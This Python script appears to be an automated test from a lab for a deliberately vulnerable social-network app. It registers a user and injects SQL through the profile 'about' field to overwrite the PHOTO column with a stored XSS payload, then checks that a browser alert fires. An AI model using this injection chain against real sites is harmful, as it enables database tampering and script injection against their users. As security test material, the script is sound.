from requests import session, get
from sys import argv
from random import randint
from Common.Driver import getScript, runAlert

SERVER = argv[1]

s = session()
username = str(randint(2 ** 27, 2 ** 28))
password = str(randint(2 ** 27, 2 ** 28))
content = "RandomPostsContent" + str(randint(2 ** 27, 2 ** 28))
alrText = "Exploited" + str(randint(2 ** 27, 2 ** 28))
scrPath = "Common/Scripts/XSS/DisplaysAlert.html"

# Cleaning DB
r = get(SERVER + "/init")
assert "Initialisation DONE!" in r.text

# User Registration
params = {
    "username": username,
    "password": password
}
r = s.post(SERVER + "/register", data=params)

assert "Welcome" in r.text
assert username in r.text

# Updating Photo in About Section
sArgs = {
    "alert": alrText
}
data = {
    "name": "",
    "currentpassword": password,
    "newpassword": "",
    "about": "', PHOTO = '\">{}' WHERE USERNAME = '{}' -- ".format(getScript(scrPath, sArgs=sArgs), username)
}
files = {
    "photo": ""
}
r = s.post(SERVER + "/update_profile", data=data, files=files)

assert "Succesfully" in r.text
assert username in r.text

# New Post Creation
data = {
    "content": content,
    "type": "Public"
}
r = s.post(SERVER + "/create_post", data=data)

assert content in r.text

# Asserting Alert
runAlert(SERVER, SERVER, s, alrText)

print("Success!")
s.close()
